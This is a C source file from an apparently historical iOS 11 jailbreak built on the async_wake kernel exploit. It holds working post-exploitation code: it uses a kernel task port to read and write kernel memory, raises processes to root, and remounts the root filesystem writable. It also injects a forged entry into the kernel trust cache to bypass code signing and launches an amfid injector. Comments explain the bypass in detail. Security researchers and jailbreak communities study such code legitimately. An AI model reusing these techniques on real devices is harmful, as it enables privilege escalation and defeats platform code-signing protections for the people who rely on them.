//
//  fun.c
//  async_wake_ios
//
//  Created by George on 14/12/17.
//  Copyright © 2017 Ian Beer. All rights reserved.
//

#include "fun.h"
#include "kcall.h"
#include "bootstrap.h"

unsigned offsetof_p_pid = 0x10;               // proc_t::p_pid
unsigned offsetof_task = 0x18;                // proc_t::task
unsigned offsetof_p_ucred = 0x100;            // proc_t::p_ucred
unsigned offsetof_p_csflags = 0x2a8;          // proc_t::p_csflags
unsigned offsetof_itk_self = 0xD8;            // task_t::itk_self (convert_task_to_port)
unsigned offsetof_itk_sself = 0xE8;           // task_t::itk_sself (task_get_special_port)
unsigned offsetof_itk_bootstrap = 0x2b8;      // task_t::itk_bootstrap (task_get_special_port)
unsigned offsetof_ip_mscount = 0x9C;          // ipc_port_t::ip_mscount (ipc_port_make_send)
unsigned offsetof_ip_srights = 0xA0;          // ipc_port_t::ip_srights (ipc_port_make_send)
unsigned offsetof_special = 2 * sizeof(long); // host::special

char *itoa(long n)
{
	int len = n==0 ? 1 : floor(log10l(labs(n)))+1;
	if (n<0) len++; // room for negative sign '-'
	
	char    *buf = calloc(sizeof(char), len+1); // +1 for null
	snprintf(buf, len+1, "%ld", n);
	return   buf;
}

typedef struct {
	uint64_t prev;
	uint64_t next;
	uint64_t start;
	uint64_t end;
} kmap_hdr_t;

uint64_t our_proc = 0;

void let_the_fun_begin(mach_port_t tfp0) {
	// Loads the kernel into the patch finder, which just fetches the kernel memory for patchfinder use
	init_kernel(find_kernel_base(), NULL);
	
	dlopen(resourceInBundle("test.dylib"), RTLD_NOW);
	
	// Get the slide
	uint64_t slide = find_kernel_base() - 0xFFFFFFF007004000;
	printf("[fun] slide: 0x%016llx\n", slide);
	
	kmap_hdr_t kernel_map;
	
	rkbuffer(rk64(0xFFFFFFF0075D5E20+slide)+0x10, &kernel_map, sizeof(kernel_map));

	uint64_t zm_tmp;
#   define ZM_FIX_ADDR(addr) \
( \
zm_tmp = (kernel_map.start & 0xffffffff00000000) | ((addr) & 0xffffffff), \
zm_tmp < kernel_map.start ? zm_tmp + 0x100000000 : zm_tmp \
)

    #define kexecute(addr, x0, x1, x2, x3, x4, x5, x6) kcall(addr, 7, x0, x1, x2, x3, x4, x6, x6)
	
	// Get our and the kernels struct proc from allproc
	uint32_t our_pid = getpid();
	our_proc = 0;
	uint64_t kern_proc = 0;
	uint64_t container_proc = 0;
	uint32_t amfid_pid = 0;
	
	uint64_t proc = rk64(find_allproc());
	while (proc) {
		uint32_t pid = (uint32_t)rk32(proc + koffset(KSTRUCT_OFFSET_PROC_PID));
		char name[40] = {0};
		rkbuffer(proc + koffset(KSTRUCT_OFFSET_PROC_P_COMM), name, 20);
		if (pid == our_pid) {
			our_proc = proc;
		} else if (pid == 0) {
			kern_proc = proc;
            init_empower(kern_proc);
		} else if (strstr(name, "amfid")) {
			container_proc = proc;
			amfid_pid = pid;
        } else if (strstr(name, "containerd")) {

        }
		if (pid != 0) {
            // fails if called before init_empower
            // but first proc is kernel proc, isn't it?
            empower(proc);
		}
		proc = rk64(proc);
	}
	
	printf("[fun] our proc is at 0x%016llx\n", our_proc);
	printf("[fun] kern proc is at 0x%016llx\n", kern_proc);
	
    empower(our_proc);
    empower(container_proc);

	// setuid(0) + test
	{
		
		printf("[fun] our uid was %d\n", getuid());
		
		setuid(0);
		
		printf("[fun] our uid is %d\n", getuid());
		
		FILE *f = fopen("/var/mobile/.root_fun", "w");
		if (f == 0) {
			printf("[fun] failed to write test file. something didn't work\n");
		} else {
			printf("[fun] wrote test file: %p\n", f);
		}
		fclose(f);
	}

	{
		printf("[fun] remounting: %d\n", mountroot());
		
		int fd = open("/.bit_of_fun", O_RDONLY);
		if (fd == -1) {
			fd = creat("/.bit_of_fun", 0644);
		} else {
			printf("[fun] file already exists!\n");
		}
		close(fd);
		
		printf("[fun] Did we mount / as read+write? %s\n", file_exist("/.bit_of_fun") ? "yes" : "no");
        unlink("/.bit_of_fun");
	}
	
	// Prepare our binaries
	{
		if (!file_exist("/fun_bins")) {
			mkdir("/fun_bins", 0777);
		}
		
		/* uncomment if you need to replace the binaries */
		unlink("/fun_bins/inject_amfid");
		unlink("/fun_bins/amfid_payload.dylib");
        unlink("/fun_bins/test.dylib");

		if (!file_exist("/fun_bins/inject_amfid")) {
			cp(resourceInBundle("inject_amfid"), "/fun_bins/inject_amfid");
			chmod("/fun_bins/inject_amfid", 0777);
		}
		if (!file_exist("/fun_bins/amfid_payload.dylib")) {
			cp(resourceInBundle("amfid_payload.dylib"), "/fun_bins/amfid_payload.dylib");
			chmod("/fun_bins/amfid_payload.dylib", 0777);
		}
		if (!file_exist("/fun_bins/test.dylib")) {
			cp(resourceInBundle("test.dylib"), "/fun_bins/test.dylib");
			chmod("/fun_bins/test.dylib", 0777);
		}
		
		printf("[fun] copied the required binaries into the right places\n");
	}
	
	// trust cache injection
	{
		/*
		 Note this patch still came from @xerub's KPPless branch, but detailed below is kind of my adventures which I rediscovered most of what he did
		 
		 So, as said on twitter by @Morpheus______, iOS 11 now uses SHA256 for code signatures, rather than SHA1 like before.
		 What confuses me though is that I believe the overall CDHash is SHA1, but each subhash is SHA256. In AMFI.kext, the memcmp
		 used to check between the current hash and the hashes in the cache seem to be this CDHash. So the question is do I really need
		 to get every hash, or just the main CDHash and insert that one into the trust chain?
		 
		 If we look at the trust chain code checker (0xFFFFFFF00637B3E8 6+ 11.1.2), it is pretty basic. The trust chain is in the format of
		 the following (struct from xerub, but I've checked with AMFI that it is the case):
		 
		 struct trust_mem {
		 uint64_t next; 				// +0x00 - the next struct trust_mem
		 unsigned char uuid[16];		// +0x08 - The uuid of the trust_mem (it doesn't seem important or checked apart from when importing a new trust chain)
		 unsigned int count;			// +0x18 - Number of hashes there are
		 unsigned char hashes[];		// +0x1C - The hashes
		 }
		 
		 The trust chain checker does the following:
		 - Find the first struct that has a count > 0
		 - Loop through all the hashes in the struct, comparing with the current hash
		 - Keeps going through each chain, then when next is 0, it finishes
		 
		 UPDATE: a) was using an old version of JTool. Now I realised the CDHash is SHA256
		 b) For launchd (whose hash resides in the AMFI cache), the first byte is used as an index sort of thing, and the next *19* bytes are used for the check
		 This probably means that only the first 20 bytes of the CDHash are used in the trust cache check
		 
		 So our execution method is as follows:
		 - Calculate the CD Hashes for the target resources that we want to play around with
		 - Create a custom trust chain struct, and insert it into the existing trust chain - only storing the first 20 bytes of each hash
		 - ??? PROFIT
		 */
		
		uint64_t tc = find_trustcache();
		printf("[fun] trust cache at: %016llx\n", rk64(tc));
		
		typedef char hash_t[20];
		
		struct trust_chain {
			uint64_t next; 				// +0x00 - the next struct trust_mem
			unsigned char uuid[16];		// +0x08 - The uuid of the trust_mem (it doesn't seem important or checked apart from when importing a new trust chain)
			unsigned int count;			// +0x18 - Number of hashes there are
			hash_t hash[10];		    // +0x1C - The hashes
		};
		
		struct trust_chain fake_chain;
		
		fake_chain.next = rk64(tc);
		*(uint64_t *)&fake_chain.uuid[0] = 0xabadbabeabadbabe;
		*(uint64_t *)&fake_chain.uuid[8] = 0xabadbabeabadbabe;
		fake_chain.count = 2;

        const char *injectthese[] = {
            ("/fun_bins/inject_amfid"),
            ("/fun_bins/amfid_payload.dylib"),
        };
        size_t injectthese_size = sizeof(injectthese)/sizeof(injectthese[0]);

        for (int i = 0; i != injectthese_size; ++i) {
            uint8_t *hash = get_sha256(get_code_directory(injectthese[i]));
            memmove(fake_chain.hash[i], hash, sizeof(hash_t));
            free(hash);
        }

		uint64_t kernel_trust = kmem_alloc(sizeof(fake_chain));
		wkbuffer(kernel_trust, &fake_chain, sizeof(fake_chain));
		wk64(tc, kernel_trust);
		
		printf("[fun] Wrote the signatures into the trust cache!\n");
	}
	
//	printf("[fun] currently cs_debug is at %d\n", rk32(0xFFFFFFF0076220EC+slide));
//	wk32(0xFFFFFFF0076220EC+slide, 100);
	
    const char* BinaryLocation = "/fun_bins/inject_amfid";
	startprog(STARTPROG_WAIT, BinaryLocation, (const char*[]){BinaryLocation, itoa(amfid_pid), NULL}, NULL);
	
	// Cleanup
	
//	char *nmz = strdup("/dev/disk0s1s1");
//	rv = mount("hfs", "/", MNT_UPDATE, (void *)&nmz);
//	printf("[fun] remounting: %d\n", rv);

//    wk64(rk64(kern_ucred+0x78)+0x8, 0);
	term_kernel();
	
}
